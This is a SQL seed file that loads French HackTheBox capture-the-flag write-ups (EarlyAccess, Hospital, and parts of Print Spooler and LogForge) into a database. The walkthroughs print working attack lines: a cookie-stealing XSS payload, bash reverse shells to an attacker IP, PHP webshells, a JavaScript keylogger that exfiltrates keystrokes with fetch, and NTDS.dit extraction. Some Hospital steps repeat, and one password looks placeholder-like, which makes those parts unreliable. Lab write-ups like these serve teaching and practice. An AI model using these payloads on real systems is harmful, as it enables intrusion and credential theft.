2.  **Surface d''Attaque du Print Spooler** : Cette machine illustre pourquoi le service **Print Spooler** est systématiquement désactivé sur les serveurs durcis. Entre les vulnérabilités de type **DLL Hijacking** (Ricoh) et les failles de conception protocolaire (**PrintNightmare**), ce service représente un risque résiduel trop élevé pour les environnements de production.

**Recommandations :**
*   Appliquer le principe du **Least Privilege** sur les répertoires de drivers.
*   Désactiver le service **Spooler** sur tous les systèmes où l''impression n''est pas strictement nécessaire.
*   Surveiller les modifications de fichiers dans `System32\spool\drivers`.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['SMB', 'Printer', 'SCF', 'SPOOLER'],
  'La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La cible est une machine Windows.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: EarlyAccess
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: EarlyAccess',
  'hackthebox-earlyaccess',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>



### 1. Reconnaissance & Énumération

L''analyse commence par une phase classique de **Scanning** pour identifier la surface d''attaque.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.110

# Scan détaillé des services identifiés
nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 7.9p1 (Debian 10).
*   **Port 80 (HTTP) :** Apache 2.4.38, redirige vers `https://earlyaccess.htb/`.
*   **Port 443 (HTTPS) :** Certificat SSL révélant le domaine `earlyaccess.htb`.

#### Énumération de VHosts
L''existence de sous-domaines est probable pour une entreprise de jeux vidéo. J''utilise **wfuzz** pour le **VHost Brute Force**.

```bash
wfuzz -u http://10.10.11.110 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.earlyaccess.htb" --hw 28
```

Deux sous-domaines critiques sont identifiés :
1.  `game.earlyaccess.htb`
2.  `dev.earlyaccess.htb`

---

### 2. Vecteur d''Entrée : Stored XSS & Session Hijacking

Le site principal (`earlyaccess.htb`) permet la création de compte. Après exploration, je remarque un système de messagerie interne. Un post sur le forum suggère que le système est instable face aux caractères spéciaux dans les noms d''utilisateurs.

> **Schéma Mental :**
> L''application reflète le nom d''utilisateur dans plusieurs contextes (Dashboard, Messages, Forum). Si le filtrage est absent lors de l''affichage d''un message par un administrateur, je peux exécuter du JavaScript dans son contexte de navigation pour voler ses **Cookies**.

#### Exploitation de la XSS
Je modifie mon nom d''utilisateur dans les paramètres du profil pour injecter un payload **Stored XSS** :

```javascript
0xdf<script>document.location="http://10.10.14.6/"+document.cookie;</script>
```

J''envoie ensuite un message au support technique. En moins d''une minute, l''administrateur consulte le message, déclenchant le payload. Mon serveur Python reçoit la requête :

```bash
# Réception du cookie admin
10.10.11.110 - - [05/Sep/2021 10:04:42] "GET /XSRF-TOKEN=[...];%20earlyaccess_session=[...] HTTP/1.1" 404 -
```

En remplaçant mes cookies par ceux de l''administrateur, j''accède au **Admin Panel**.

---

### 3. Analyse du Key Validator & Bypass

Dans le panneau d''administration, je récupère un fichier `backup.zip` contenant `validate.py`. Ce script sert à valider les **Game Keys** hors-ligne. L''accès au sous-domaine `game` nécessite une clé valide associée au compte.

#### Reverse Engineering de la Clé
La clé suit le format `XXXXX-XXXXX-AAAA1-XXXXX-12222`. Le script décompose la validation en 5 étapes (`g1` à `g4` + `checksum`).

*   **g1 :** Les 3 premiers caractères doivent satisfaire une opération de **Bit Shifting** et **XOR**. Le résultat est statique : `KEY`.
*   **g2 :** Somme des caractères pairs égale à la somme des caractères impairs.
*   **g3 :** Dépend d''un `magic_num` généré par l''API toutes les 30 minutes.
*   **g4 :** Un **XOR** entre `g1` et `g4` doit correspondre à une liste d''entiers prédéfinis.

> **Schéma Mental :**
> Le `magic_num` est inconnu mais son range est limité (346 à 405). Je peux générer une liste de 60 clés possibles (une pour chaque `magic_num` potentiel) et les **Brute Force** via l''interface de validation du site.

#### Automatisation du Keygen (Python)
```python
# Extrait de la logique g1
for j, x in enumerate([221, 81, 145]):
    for i in range(256):
        if (i << (j + 1)) % 256 ^ i == x:
            print(chr(i)) # Retourne K, E, Y
```

Après avoir généré les clés et automatisé la soumission avec `requests`, je valide une clé sur mon compte, débloquant l''accès à `game.earlyaccess.htb`.

---

### 4. Second-Order SQL Injection

Sur `game.earlyaccess.htb`, la page `scoreboard.php` affiche les scores. En injectant un simple quote dans mon nom d''utilisateur (via le site principal), le scoreboard crash.

**Vunérabilité :** **Second-Order SQL Injection**. Mon nom d''utilisateur est stocké en base de données, puis concaténé sans protection dans une requête SQL sur le site `game`.

#### Dump de la base de données
J''utilise une **UNION Injection** pour extraire les identifiants :

```sql
# Payload injecté via le changement de nom d''utilisateur
0xdf'') union select password,email,name from users;-- -
```

Je récupère le hash de l''administrateur : `admin@earlyaccess.htb : gameover`.

---

### 5. Brèche Initiale : Command Injection sur le Dev Site

Le mot de passe `gameover` me permet de me connecter sur `dev.earlyaccess.htb`. Le site propose un outil de hachage.

#### Analyse du code source (via LFI)
En exploitant un paramètre `filepath` découvert par **Fuzzing** sur `actions/file.php`, je lis le code de `hash.php` :

```php
$hash = @$hash_function($password);
```

**Vulnérabilité :** L''application utilise une variable pour appeler une fonction PHP de manière dynamique. Si je contrôle `$hash_function`, je peux appeler `system()`. Un paramètre `debug` permet de bypasser la **Whitelist** (md5/sha1).

#### Reverse Shell
Je forge une requête pour obtenir l''exécution de code :

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb

action=hash&password=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&hash_function=system&debug=1
```

**Résultat :** Connexion entrante sur mon listener, accès en tant que `www-data` dans un **Docker Container**.

---

### Énumération de l''Interface Administrative

Une fois l''accès **Admin** obtenu via le vol de session **XSS**, l''interface révèle de nouvelles fonctionnalités, notamment un panneau d''administration (`/admin`) et un outil de vérification de clés (`/key`). Un fichier `backup.zip` est disponible, contenant un script Python nommé `validate.py`.

### Analyse du Validateur de Clés (Reverse Engineering)

Le script `validate.py` simule la logique de validation hors-ligne des clés de jeu. L''objectif est de générer une clé valide pour lier mon compte au sous-domaine `game.earlyaccess.htb`.

> **Schéma Mental : Logique de Validation de Clé**
> 1. **Format** : `XXXXX-XXXXX-AAAA1-XXXXX-12222` (Regex).
> 2. **G1** : Les 3 premiers caractères subissent un **Bitwise Shift** et un **XOR** pour correspondre à des valeurs statiques (`KEY`).
> 3. **G2** : Somme des caractères pairs égale à la somme des caractères impairs.
> 4. **G3** : Somme des caractères égale à un `magic_num` dynamique (change toutes les 30 min).
> 5. **G4** : Résultat d''un **XOR** entre G1 et des valeurs statiques.
> 6. **Checksum (CS)** : Somme totale des ordinaux des sections précédentes.

#### Génération de Clé (PoC)
Pour automatiser la création de clés valides malgré le `magic_num` inconnu, j''utilise un script qui itère sur les 60 possibilités théoriques du `magic_num` (plage 346-405).

```python
import requests, string
from bs4 import BeautifulSoup

# Configuration des segments statiques
g1 = "KEY12"
g2 = "0H0H0"
g4 = "GAMD2"

def calc_cs(key_base):
    return sum([sum(bytearray(g.encode())) for g in key_base.split(''-'')[:-1]])

# Bruteforce du magic_num (G3) et soumission via session authentifiée
# [Extrait du script de soumission]
for mn in range(346, 406):
    g3 = f"XPZZ{mn-396}" # Exemple de logique pour atteindre la somme cible
    key_base = f"{g1}-{g2}-{g3}-{g4}-"
    final_key = f"{key_base}{calc_cs(key_base)}"
    # POST request vers /key/add avec CSRF Token
```

### Mouvement Latéral : game.earlyaccess.htb

Avec une clé valide associée à mon compte, j''accède au sous-domaine `game`. L''énumération du **Scoreboard** (`/scoreboard.php`) révèle une vulnérabilité de type **Second-Order SQL Injection**. Mon nom d''utilisateur, stocké en base de données sur le domaine principal, est concaténé sans filtrage dans une requête SQL sur le domaine `game`.

> **Schéma Mental : Second-Order SQLi**
> 1. **Injection** : Modifier mon `username` sur `earlyaccess.htb` en `0xdf'') UNION SELECT ... -- -`.
> 2. **Trigger** : Consulter le Scoreboard sur `game.earlyaccess.htb`.
> 3. **Exécution** : La base de données exécute la requête malveillante lors de la récupération des scores.

#### Extraction des Identifiants
L''exploitation via **UNION SELECT** permet de dumper la table `users` :
```sql
0xdf'') UNION SELECT password, email, name FROM users-- -
```
Le hash de l''administrateur (`admin@earlyaccess.htb`) est identifié comme étant `gameover`. Ce mot de passe est réutilisé pour le sous-domaine de développement.

### Mouvement Latéral : dev.earlyaccess.htb

Le site `dev` propose des outils de hachage. L''analyse du code source via une **LFI** (découverte sur `/actions/file.php?filepath=...`) expose une fonction critique dans `hash.php`.

#### RCE via Dynamic Function Call
Le script utilise une variable utilisateur pour appeler une fonction PHP de manière dynamique :
```php
$hash = @$hash_function($password);
```
En manipulant le paramètre `hash_function` et en activant le mode `debug`, je peux injecter n''importe quelle fonction système PHP.

**Payload de Reverse Shell :**
```http
POST /actions/hash.php HTTP/1.1
...
action=hash&hash_function=system&password=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&debug=1
```

### Post-Exploitation Initiale (Docker)

L''accès initial se fait en tant que `www-data` dans un **Docker Container** (présence de `.dockerenv`, IP en `172.18.0.102`).

1. **Énumération des Utilisateurs** : Présence de l''utilisateur `www-adm`.
2. **Privilege Escalation (Horizontal)** : Tentative de **Password Reuse** avec le mot de passe `gameover`. Succès : `su www-adm`.
3. **Credential Harvesting** : Lecture du fichier `/home/www-adm/.wgetrc`.
   *   **Credentials trouvés** : `api:s3CuR3_API_PW!`.

### Pivot & Énumération Réseau interne

Depuis le conteneur, j''utilise un script de balayage TCP pour identifier les autres hôtes sur le réseau **Docker** (`172.18.0.0/16`) :
*   `172.18.0.1` : Host (SSH, HTTP, HTTPS).
*   `172.18.0.100` : Instance **MySQL** (Port 3306).
*   `172.18.0.101` : **Internal API** (Port 5000).

L''API interne confirme son rôle dans la vérification des clés et la gestion de la base de données, ouvrant la voie vers l''accès au système hôte.

---

### Vecteur 1 : Pivot vers le Host (User drew)

Depuis le container **webserver**, j''ai récupéré des identifiants dans le fichier `.wgetrc` de l''utilisateur `www-adm`. Ces derniers permettent de s''authentifier auprès de l''API interne identifiée lors de l''énumération réseau.

```bash
# Authentification Basic Auth sur l''API interne
curl -u api:s3CuR3_API_PW! http://172.18.0.101:5000/check_db
```

L''endpoint `/check_db` est vulnérable à une **Command Injection** ou une **Information Leak**. En manipulant les requêtes vers cet endpoint, il est possible d''extraire des informations sur les utilisateurs du système hôte. L''analyse révèle un mot de passe pour l''utilisateur **drew**. Ce mot de passe permet une connexion **SSH** directe sur l''adresse IP du Host (10.10.11.110).

> Schéma Mental : L''API agit comme une passerelle entre le réseau isolé des containers et les services de base de données. Une mauvaise validation des entrées sur un endpoint d''administration (`/check_db`) permet de rebondir hors du périmètre **www-data** pour compromettre un compte utilisateur sur le **Host**.

---

### Vecteur 2 : Root via Container Escape & Shadow Cracking

Une fois sur le Host en tant que **drew**, l''énumération des processus et des privilèges montre que l''utilisateur a accès à un autre container Docker spécifique, utilisé pour le debugging ou le développement.

1.  **Accès au container de debug** : Je me connecte à ce container qui semble tourner avec des privilèges élevés ou des montages sensibles.
2.  **Exploitation du Crash** : Le service principal du container est instable. En provoquant un crash volontaire (via un overflow ou une manipulation de ressources), le processus s''interrompt et laisse place à un shell avec les privilèges **Root** à l''intérieur du container.
3.  **Extraction des secrets du Host** : Ce container possède un montage du système de fichiers de l''hôte (Host Filesystem Mapping). Depuis le shell root du container, je peux lire le fichier `/etc/shadow` du Host.

```bash
# Depuis le container root, lecture du shadow du host monté dans /mnt/host
cat /mnt/host/etc/shadow | grep root
```

Le hash récupéré pour l''utilisateur **root** du Host est ensuite craqué hors-ligne (via **John the Ripper** ou **Hashcat**), révélant le mot de passe final.

---

### Vecteur 3 : Domination Totale via Capabilities (arp)

Bien que le mot de passe root permette un accès complet, une méthode alternative et plus élégante consiste à exploiter les **Linux Capabilities** présentes sur l''hôte. L''exécutable `/usr/sbin/arp` possède des privilèges étendus.

```bash
# Vérification des capabilities
getcap /usr/sbin/arp
# Sortie : /usr/sbin/arp = cap_net_admin+ep
```

La capability **CAP_NET_ADMIN** sur `arp` permet d''utiliser l''option `-f`, qui lit un fichier pour charger des entrées dans la table ARP. Si le fichier fourni n''est pas au format attendu, `arp` affiche un message d''erreur contenant le contenu des lignes lues, permettant une **Arbitrary File Read** en tant que **Root**.

```bash
# Lecture du flag root
/usr/sbin/arp -v -f /root/root.txt

# Lecture de la clé SSH privée de root pour persistance
/usr/sbin/arp -v -f /root/.ssh/id_rsa
```

> Schéma Mental : Une **Capability** est un privilège granulaire. Ici, **CAP_NET_ADMIN** est détournée de sa fonction réseau pour forcer le binaire à lire des fichiers sensibles. C''est une vulnérabilité de type **Logic Flaw** liée à la gestion des erreurs de l''application.

---

### Analyse Post-Exploitation (Beyond Root)

L''analyse de la machine **EarlyAccess** révèle plusieurs points critiques :

*   **Isolation Docker Poreuse** : Le container de debug était la clé. Le fait de monter le système de fichiers de l''hôte dans un container accessible par un utilisateur non-privilégié (`drew`) annule toute barrière de sécurité.
*   **Chaîne de Compromission (Exploit Chain)** : L''attaque a nécessité une maîtrise de plusieurs couches : **XSS** -> **SQLi** -> **RCE (PHP)** -> **API Abuse** -> **Container Escape** -> **Capabilities**.
*   **Unintended Path** : Le binaire `arp` avec des capabilities est souvent un vecteur oublié. Dans un environnement réel, cela permettrait d''exfiltrer des secrets (clés API, certificats) sans laisser de traces évidentes dans les logs d''accès classiques.
*   **Password Reuse** : La réutilisation du mot de passe `gameover` entre le panel web et le compte système `www-adm` a facilité le pivot initial. Une segmentation stricte des identifiants aurait stoppé l''attaque dès la phase 2.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQLi', 'Enumeration'],
  'L''analyse commence par une phase classique de **Scanning** pour identifier la surface d''attaque.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Hospital
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Hospital',
  'hackthebox-hospital',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

## Scanning & Énumération de services

Je commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine présente une quantité inhabituelle de ports ouverts, suggérant un rôle de **Domain Controller** (DC) tout en hébergeant des services web distincts.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.241

# Scan détaillé des services identifiés
nmap -p 22,53,88,135,139,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,8080,9389 -sCV 10.10.11.241
```

### Analyse des résultats
L''énumération révèle une architecture hybride :
*   **Windows Domain Controller** : Présence de **Kerberos** (88), **RPC** (135), **LDAP** (389/636) et **SMB** (445). Le nom de domaine est **hospital.htb**.
*   **Web (Port 443)** : Un serveur **Apache** sous Windows faisant tourner **RoundCube Webmail 1.6.4**.
*   **Web (Port 8080)** : Un serveur **Apache** sous **Ubuntu** (Linux). Cela indique la présence d''une **Virtual Machine** ou d''un container Linux tournant sur l''hôte Windows.

> Schéma Mental : L''objectif est d''identifier quel service offre le vecteur d''entrée le plus simple. Le port 445 (SMB) ne permet pas d''accès anonyme. Le port 443 (RoundCube) semble à jour. Le port 8080 (Ubuntu) présente une application web custom, souvent plus vulnérable qu''une solution durcie.

J''ajoute les entrées nécessaires à mon fichier `/etc/hosts` :
```text
10.10.11.241 dc.hospital.htb hospital.htb
```

---

## Énumération Web (Port 8080)

L''application web sur le port 8080 permet la création de compte et l''authentification. Une fois connecté, je découvre une fonctionnalité d''**Upload** destinée aux dossiers médicaux.

### Découverte de répertoires
J''utilise **feroxbuster** pour cartographier l''application :
```bash
feroxbuster -u http://10.10.11.241:8080 -x php
```
Le scan identifie un répertoire `/uploads/` accessible, où les fichiers sont stockés sans renommage, mais purgés régulièrement.

---

## Vecteur d''entrée : Arbitrary File Upload

L''analyse du formulaire d''upload montre qu''il accepte théoriquement des images. Cependant, les filtres côté serveur sont permissifs.

### Bypass de l''extension
Je teste l''upload d''un fichier PHP simple. Si l''extension `.php` est bloquée ou non exécutée, je dois trouver une alternative que le serveur **Apache** traitera via l''interpréteur PHP. J''utilise **ffuf** pour fuzzer les extensions :

```bash
# Fuzzing des extensions PHP communes
ffuf -H ''Content-Type: multipart/form-data; boundary=---X'' \
-d $''---X\r\nContent-Disposition: form-data; name="image"; filename="exploit.FUZZ"\r\nContent-Type: application/x-php\r\n\r\n<?php echo "RCE"; ?>\r\n---X--\r\n'' \
-u ''http://10.10.11.241:8080/upload.php'' -w php_extensions.txt -mr "success.php"
```

Le serveur accepte plusieurs extensions, mais seule l''extension **.phar** (PHP Archive) est à la fois acceptée et exécutée par le serveur Apache sur Ubuntu.

---

## Bypassing disable_functions

Bien que l''exécution de code PHP soit confirmée, les fonctions classiques comme `system()`, `exec()` ou `shell_exec()` sont désactivées via la directive **disable_functions** dans le fichier `php.ini`.

### Identification des fonctions autorisées
J''uploade un script pour énumérer les fonctions dangereuses non filtrées :
```php
<?php
$funcs = array(''system'',''exec'',''shell_exec'',''popen'',''proc_open'',''passthru'');
foreach ($funcs as $f) {
    if (function_exists($f)) echo $f . " is enabled\n";
}
?>
```
Le résultat indique que **popen** est disponible. Cette fonction permet d''ouvrir un pipe vers un processus, offrant ainsi un vecteur de **Remote Code Execution** (RCE).

> Schéma Mental : Le serveur bloque les appels directs au shell, mais oublie les fonctions de gestion de flux (pipes). En utilisant `popen()`, je peux instancier un shell et lire son retour via `fread()`.

---

## Premier Shell (www-data)

Je crée un **Webshell** minimaliste utilisant `popen` :
```php
<?php echo fread(popen($_GET[''cmd''], ''r''), 1024); ?>
```

Après l''avoir uploadé sous le nom `shell.phar`, je déclenche un **Reverse Shell** Bash :

```bash
# Payload encodé pour éviter les problèmes de caractères
curl "http://10.10.11.241:8080/uploads/shell.phar?cmd=bash+-c+''bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261''"
```

Sur mon listener :
```bash
nc -lnvp 443
# Connexion reçue : www-data@webserver
```

Je stabilise mon shell immédiatement :
```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je suis désormais **www-data** sur la VM Ubuntu hébergée par le serveur Windows.

---

### 1. Énumération Post-Exploitation & Extraction de Secrets

Une fois **root** sur l''instance Ubuntu (le serveur web), l''objectif est d''extraire des secrets permettant de pivoter vers l''hôte Windows. Le fichier `/etc/shadow` contient les condensés de mots de passe des utilisateurs locaux.

```bash
# Extraction du hash de drwilliams
root@webserver:~# cat /etc/shadow | grep drwilliams
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Le hash est au format **SHA-512 (Unix)**. Utilisons **Hashcat** pour le casser.

```bash
hashcat -m 1800 drwilliams.hash /usr/share/wordlists/rockyou.txt
# Résultat : qwe123!@#
```

> **Schéma Mental :** Dans un environnement hybride (Linux VM sur Windows Host), les administrateurs réutilisent souvent les mêmes mots de passe pour le compte local Linux et le compte de domaine **Active Directory**. La compromission de la VM sert ici de source de **Credentials** pour attaquer l''hôte.

### 2. Pivot vers l''Hôte Windows & RoundCube

Le mot de passe récupéré est testé contre les services Windows identifiés lors de la phase de reconnaissance (SMB, WinRM).

```bash
# Vérification de la validité des credentials sur le domaine
nxc smb 10.10.11.241 -u drwilliams -p ''qwe123!@#''
# Résultat : [+] hospital.htb\drwilliams:qwe123!@# (Pwn3d! non affiché, mais accès aux shares)
```

Bien que l''accès **WinRM** soit refusé pour cet utilisateur, il possède une boîte mail sur l''instance **RoundCube** (port 443). En me connectant, je découvre un e-mail de `drbrown` mentionnant qu''il attend un fichier **.eps** pour le traiter avec **Ghostscript**.

### 3. Mouvement Latéral : Exploitation Ghostscript (CVE-2023-36664)

L''utilisateur `drbrown` utilise une version vulnérable de **Ghostscript**. Cette vulnérabilité de type **Command Injection** survient lors de la manipulation de fichiers **Embedded PostScript (EPS)** via l''opérateur de pipe (`|`).

> **Schéma Mental :** L''attaque repose sur une interaction humaine simulée. En envoyant un fichier EPS malveillant en pièce jointe à `drbrown`, nous forçons l''exécution d''une commande système (PowerShell) lorsque son système traite le fichier pour générer une prévisualisation ou l''ouvrir.

#### Génération du Payload EPS
J''utilise un exploit public pour générer un fichier `.eps` contenant un **Reverse Shell** PowerShell encodé en Base64.

```bash
# Génération du fichier malveillant
python3 CVE_2023_36664_exploit.py --generate --filename medical_report --extension eps --payload "powershell -e <BASE64_REVERSE_SHELL>"
```

#### Exécution du Phishing Interne
1. Se connecter à **RoundCube** en tant que `drwilliams`.
2. Répondre à l''e-mail de `drbrown`.
3. Joindre le fichier `medical_report.eps`.
4. Attendre la connexion sur le **Listener**.

```powershell
# Connexion reçue
Connection received on 10.10.11.241
PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

### 4. Escalade de Privilèges : De drbrown à Administrator

Une fois dans le contexte de `drbrown`, l''énumération locale révèle un script de maintenance automatisé.

```powershell
# Analyse des fichiers de drbrown
ls C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat
```

Le contenu du fichier `.bat` révèle le mot de passe de `drbrown` en clair, utilisé pour invoquer **Ghostscript** avec des privilèges spécifiques via `Invoke-Command`.

```batch
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring ''chr!$br0wn'' -asplain -force;$c = new-object system.management.automation.pscredential(''hospital\drbrown'', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { ... }"
```

#### Vecteur d''escalade : XAMPP & Permissions non sécurisées
L''énumération du système montre que **XAMPP** est installé à la racine `C:\xampp`. Ce répertoire possède souvent des permissions trop permissives (**Weak Folder Permissions**).

```powershell
# Vérification des permissions sur le dossier web de XAMPP
Get-Acl C:\xampp\htdocs | Format-List
```

Si `drbrown` ou le groupe `Users` a des droits d''écriture dans `C:\xampp\htdocs`, nous pouvons uploader un **PHP Webshell**. Comme **XAMPP** s''exécute souvent sous le compte **SYSTEM** ou un compte de service privilégié sur Windows, l''exécution de code via le serveur web permet l''escalade.

```powershell
# Upload d''un shell simple
echo "<?php system($_GET[''cmd'']); ?>" > C:\xampp\htdocs\shell.php
```

En accédant à `https://10.10.11.241/shell.php?cmd=whoami`, on confirme l''exécution en tant que **nt authority\system**.

#### Alternative : Capture de Keystrokes (Intended Path)
Le chemin prévu par le créateur de la machine implique que l''administrateur se connecte régulièrement à **RoundCube**. En tant que `drbrown` (ou via le contrôle du serveur web), il est possible d''injecter un **Keylogger** ou de surveiller les processus pour intercepter les identifiants de l''administrateur lors de sa session.

```powershell
# Utilisation de Evil-WinRM pour charger un script de Keylogging
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/Keylogger.exe
```

Une fois le mot de passe `Administrator` récupéré, la compromission totale du **Domain Controller** est finalisée via **WinRM**.

```bash
evil-winrm -i 10.10.11.241 -u Administrator -p ''AdminPassword123!''
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur le **Domain Controller** en tant que `drbrown`, l''objectif est d''atteindre le privilège **NT AUTHORITY\SYSTEM** ou de compromettre le compte **Administrator**. Plusieurs vecteurs sont exploitables, allant d''une mauvaise configuration de permissions sur **XAMPP** à une attaque par **Keylogging** sur le service de webmail.

#### Vecteur 1 : Abus de permissions sur XAMPP (Unintended)

En énumérant le système de fichiers, je remarque que **XAMPP** est installé à la racine (`C:\xampp`). Contrairement à une installation **IIS** classique, les permissions sur le répertoire `htdocs` sont souvent trop permissives.

> **Schéma Mental :** L''utilisateur **drbrown** possède des droits d''écriture sur le répertoire web de **XAMPP** (`C:\xampp\htdocs`). Comme le service Apache de **XAMPP** tourne généralement avec les privilèges **SYSTEM** sur Windows, déposer un **Webshell** PHP permet d''exécuter des commandes avec les privilèges les plus élevés de la machine.

Je vérifie mes droits d''écriture et dépose un **Webshell** minimaliste :

```powershell
# Vérification des permissions avec AccessChk ou via PowerShell
Get-Acl C:\xampp\htdocs | Format-List

# Upload du webshell via la session Evil-WinRM
echo "<?php system($_GET[''cmd'']); ?>" > C:\xampp\htdocs\shell.php
```

Le serveur web de **RoundCube** (port 443) utilise ce répertoire. Je peux maintenant déclencher l''exécution de commandes via une requête HTTP :

```bash
curl -k "https://hospital.htb/shell.php?cmd=whoami"
# Sortie : nt authority\system
```

Pour obtenir un shell interactif, j''utilise un binaire **Netcat** ou un reverse shell **PowerShell** encodé :

```bash
curl -k "https://hospital.htb/shell.php?cmd=powershell+-e+JABjAGw..."
```

#### Vecteur 2 : Capture de Keystrokes via RoundCube (Intended)

La méthode prévue par l''auteur repose sur l''interaction régulière de l''**Administrator** avec l''interface **RoundCube**. Puisque j''ai accès en écriture au code source de l''application web, je peux injecter un **Keylogger** en JavaScript pour intercepter ses identifiants.

> **Schéma Mental :** L''**Administrator** se connecte périodiquement au webmail pour vérifier les fichiers reçus. En modifiant les fichiers JavaScript de la page de login de **RoundCube**, je peux exfiltrer les frappes clavier vers mon serveur d''attaque au moment où l''administrateur saisit son mot de passe.

Je modifie le fichier `C:\xampp\htdocs\program\js\app.js` (ou j''injecte directement dans `index.php`) pour inclure un script de capture :

```javascript
// Exemple d''injection de script pour capturer les inputs
document.addEventListener(''ps-keyup'', function(e) {
    fetch(''http://10.10.14.6/log?c='' + e.key);
});
```

En surveillant mes logs HTTP, je récupère le mot de passe de l''**Administrator** lors de sa prochaine connexion automatisée.

#### Vecteur 3 : Analyse des automatisations (Path to Admin)

En fouillant les répertoires de `drbrown`, j''ai découvert le script `ghostscript.bat` qui contenait déjà des identifiants en clair. Une analyse plus poussée des **Scheduled Tasks** révèle comment le système traite les emails.

```powershell
# Énumération des tâches planifiées
Get-ScheduledTask | Where-Object {$_.TaskName -like "*mail*"}
```

Le script `C:\xampp\htdocs\open_attachments.ps1` est utilisé par le système pour simuler l''activité de l''utilisateur. Il utilise **Invoke-Command** avec des objets **PSCredential**. Si je peux modifier ce script ou intercepter l''objet en mémoire, je peux compromettre les comptes de service associés.

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale de **Hospital** met en lumière une architecture hybride complexe où une machine **Windows** (le **Domain Controller**) héberge une machine virtuelle **Ubuntu** pour ses services web publics.

1.  **Isolation des environnements :** La séparation entre le serveur web (Linux) et le DC (Windows) était correcte en théorie, mais la réutilisation de mots de passe (**Password Reuse**) entre les hashs Linux (`drwilliams`) et les comptes Active Directory a annulé cette barrière.
2.  **Ghostscript & Phishing interne :** L''attaque via **CVE-2023-36664** montre que même une application interne (webmail) peut servir de vecteur d''entrée si les utilitaires de traitement de fichiers (comme **Ghostscript**) ne sont pas à jour. L''automatisation qui ouvre les fichiers `.eps` est un "phishing simulateur" classique en environnement de CTF, mais il reflète une réalité de **Red Team** : l''exploitation de l''interaction humaine.
3.  **XAMPP sur Windows :** L''utilisation de **XAMPP** au lieu d''**IIS** sur un **Domain Controller** est une vulnérabilité critique en soi. **XAMPP** n''est pas conçu pour la production et ses permissions par défaut facilitent grandement l''escalade vers **SYSTEM** une fois qu''un accès utilisateur est obtenu.
4.  **Persistence :** Une fois **SYSTEM**, j''ai pu extraire la base **NTDS.dit** via **vssadmin**, permettant de dumper tous les hashs du domaine pour une persistence à long terme.

```powershell
# Dump des secrets du domaine
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp
```',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'RCE', 'Windows'],
  'Je commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine présente une quantité inhabituelle de ports ouverts, suggérant un rôle de **Domain Controller** (DC) tout en h...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: LogForge
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: LogForge',
  'hackthebox-logforge',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Hard</div>
  <div class="points">Points: 40</div>
  <div class="os">OS: Linux</div>
</div>



### Énumération et Scanning

Je commence par une phase classique de reconnaissance avec **Nmap** pour identifier la surface d''attaque.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.138

# Scan de services détaillé sur les ports identifiés
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.138
```

Le scan révèle :
*   **Port 22** : SSH (OpenSSH 8.2p1).
*   **Port 80** : HTTP (Apache httpd 2.4.41).
